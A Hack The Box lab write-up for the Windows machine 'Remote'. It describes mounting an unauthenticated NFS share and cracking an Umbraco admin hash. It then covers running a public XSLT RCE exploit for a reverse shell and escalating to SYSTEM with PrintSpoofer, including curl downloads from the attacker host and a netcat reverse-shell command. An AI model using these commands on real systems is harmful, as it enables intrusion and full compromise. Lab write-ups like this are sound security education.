
# HTB Write-Up: Remote

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Remote)        |
| Difficulty | Easy                                                           |
| OS         | Windows                                                          |
| Author     | Samurai                                                         |
| Date       | June 10, 2026                                                 |

---

## Overview

REMOTE is a Windows machine that chains together several classic misconfigurations. The attack path begins with an NFS share exposed without authentication, containing a full Umbraco CMS site backup. The backup's SQLite database yields a SHA1 password hash for the admin account, which is cracked offline. Admin access to the Umbraco backoffice is then abused via an authenticated XSLT-injection RCE vulnerability to obtain a reverse shell running as a low-privileged IIS service account. The account holds `SeImpersonatePrivilege`, which is exploited using PrintSpoofer to impersonate `NT AUTHORITY\SYSTEM` and capture the root flag.

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Credential Discovery — NFS + Umbraco Database](#credential-discovery)
4. [Hash Cracking](#hash-cracking)
5. [Initial Foothold — Umbraco Authenticated RCE](#initial-foothold)
6. [Privilege Escalation — SeImpersonatePrivilege via PrintSpoofer](#privilege-escalation)

---

## Reconnaissance

Port scanning was performed using Nmap with aggressive service and OS detection against the identified open ports.

```bash
nmap -A 10.129.230.172 -p21,80,111,135,139,445,2049,5985
```

```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
2049/tcp open  nlockmgr      1-4 (RPC #100021)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### Open Ports Summary

| Port | Protocol | Service | Version |
|------|----------|---------|---------|
| 21 | TCP | FTP | Microsoft ftpd — Anonymous login allowed |
| 80 | TCP | HTTP | Microsoft HTTPAPI 2.0 — Acme Widgets site |
| 111 | TCP | rpcbind | 2-4 (RPC #100000) |
| 2049 | TCP | NFS | nlockmgr — NFS share exposed |
| 135 | TCP | MSRPC | Microsoft Windows RPC |
| 139/445 | TCP | SMB | Windows netbios/microsoft-ds |
| 5985 | TCP | WinRM | Microsoft HTTPAPI 2.0 |

---

## Enumeration

### NFS Share Discovery

The presence of `rpcbind` on port 111 and `nfs` on port 2049 indicated a Network File System share. The available exports were listed and mounted without authentication:

```bash
showmount -e 10.129.230.172
# Export list for 10.129.230.172:
# / (everyone)

sudo mkdir -p /mnt/nfs_share
sudo mount -t nfs 10.129.230.172:/ /mnt/nfs_share
cd /mnt/nfs_share
ls
# site_backups
```

The share contained a complete Umbraco CMS site backup.

### Site Backup Structure

```bash
cd site_backups
ls
# App_Browsers  App_Data  App_Plugins  bin  Config  css
# default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
```

The `App_Data` and `Config` directories were of immediate interest. The `Config/` directory contained standard Umbraco XML configuration files. The most valuable find was in `App_Data/`:

```bash
find . -name "*.sdf" -o -name "*.mdf" 2>/dev/null
# ./App_Data/Umbraco.sdf
```

---

## Credential Discovery

### Extracting Hashes from Umbraco.sdf

The `Umbraco.sdf` file is a SQL Server Compact Edition database. Running `strings` against it revealed user records with password hashes directly in the output:

```bash
strings ./App_Data/Umbraco.sdf | head -20
```

```
Administratoradmindefaulten-US
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}
```

### Extracted Credentials

| User | Email | Hash | Algorithm |
|------|-------|------|-----------|
| admin | admin@htb.local | `b8be16afba8c314ad33d812f22a04991b90e2aaa` | SHA1 |
| ssmith | ssmith@htb.local | `8+xXICbPe7m5NQ22HfcGlg==:RF9OLinww9...` | HMACSHA256 |

The admin account used unsalted SHA1, making it the easiest target.

---

## Hash Cracking

The SHA1 hash was cracked offline using Hashcat against the `rockyou.txt` wordlist:

```bash
echo "b8be16afba8c314ad33d812f22a04991b90e2aaa" > hash.txt
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
```

```
b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
```

**Credentials obtained:** `admin@htb.local` / `baconandcheese`

---

## Initial Foothold

### Umbraco Authenticated Remote Code Execution

With valid admin credentials, the Umbraco backoffice was accessible at `http://remote/umbraco`. Umbraco 7.12.4 is vulnerable to an authenticated RCE via the XSLT visualization endpoint, which allows embedded C# code execution through the `msxsl:script` extension.

A public exploit was used to automate authentication and payload delivery:

```bash
git clone https://github.com/noraj/Umbraco-RCE
cd Umbraco-RCE
```

Initial attempts failed due to a trailing slash in the `-w` parameter causing a double-slash in the constructed URLs, which broke the login flow:

```
# Broken — double slash in URL
python3 exploit.py -u admin@htb.local -p baconandcheese -w http://remote/umbraco/ -i 10.10.15.24
# TypeError: 'NoneType' object is not subscriptable (__VIEWSTATE not found)
```

Removing the trailing slash resolved the issue:

```bash
python3 exploit.py -u admin@htb.local -p baconandcheese -w http://remote -i 10.10.15.24
```

```
[+] Got connection from ::ffff:10.129.230.172 on port 49706
[+] Got connection from ::ffff:10.129.230.172 on port 49707
[*] Logging in at http://remote/umbraco/backoffice/UmbracoApi/Authentication/PostLogin
[*] Exploiting at http://remote/umbraco/developer/Xslt/xsltVisualize.aspx
[*] Switching to interactive mode
PS C:\windows\system32\inetsrv>
```

A stable PowerShell reverse shell was obtained running as the IIS application pool identity.

### Privilege Enumeration

```
PS C:\windows\system32\inetsrv> whoami /priv

Privilege Name                Description                               State
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
```

`SeImpersonatePrivilege` was enabled — a well-known privilege escalation vector on Windows.

---

## Privilege Escalation

### SeImpersonatePrivilege via PrintSpoofer

The IIS service account held `SeImpersonatePrivilege`, which can be abused to impersonate `NT AUTHORITY\SYSTEM` using PrintSpoofer — a tool that leverages the Windows Print Spooler to force a SYSTEM-level authentication callback.

**Transfer tools to target:**

An HTTP server was started on the attacker machine to serve the binaries:

```bash
# Attacker
python3 -m http.server 80
```

```powershell
# Target shell
cd C:\
mkdir temp
cd temp
curl 10.10.15.24/PrintSpoofer64.exe -o PrintSpoofer64.exe
curl 10.10.15.24/nc/nc64.exe -o nc.exe
```

**Verify impersonation works:**

```powershell
PS C:\temp> .\PrintSpoofer64.exe -i -c "whoami"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
nt authority\system
```

**Trigger SYSTEM reverse shell:**

A netcat listener was started on the attacker machine:

```bash
rlwrap nc -nvlp 9001
```

PrintSpoofer was then used to execute `nc.exe` as SYSTEM:

```powershell
PS C:\temp> .\PrintSpoofer64.exe -i -c ".\nc.exe -e cmd 10.10.15.24 9001"
```

```
connect to [10.10.15.24] from (UNKNOWN) [10.129.230.172] 49714
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

**Root flag captured.**

---

## Attack Chain Summary

```
Port 2049 (NFS — unauthenticated)
    └─► Mount site_backups share
            └─► App_Data/Umbraco.sdf → SHA1 hash extraction
                    └─► Hashcat (rockyou.txt) → baconandcheese
                            └─► Umbraco admin login (admin@htb.local)
                                    └─► Authenticated XSLT RCE (Umbraco 7.12.4)
                                            └─► Reverse shell as IIS service account
                                                    └─► SeImpersonatePrivilege enabled
                                                            └─► PrintSpoofer64.exe
                                                                    └─► NT AUTHORITY\SYSTEM → root.txt
```

---

## Key Takeaways

- NFS shares exposed to `everyone` without authentication are a critical misconfiguration — application backups should never be accessible over the network without access controls.
- Umbraco stores its user database in `App_Data/Umbraco.sdf`, which contains password hashes readable with basic tooling (`strings`). Older versions default to unsalted SHA1, trivially crackable with common wordlists.
- The trailing slash bug in the exploit URL (`http://host/umbraco/` vs `http://host`) is a common pitfall — always verify URL construction when adapting public PoCs.
- IIS application pool identities routinely hold `SeImpersonatePrivilege`. Any RCE via IIS on an unpatched Windows host should immediately be assessed for PrintSpoofer or similar potato-family escalation.
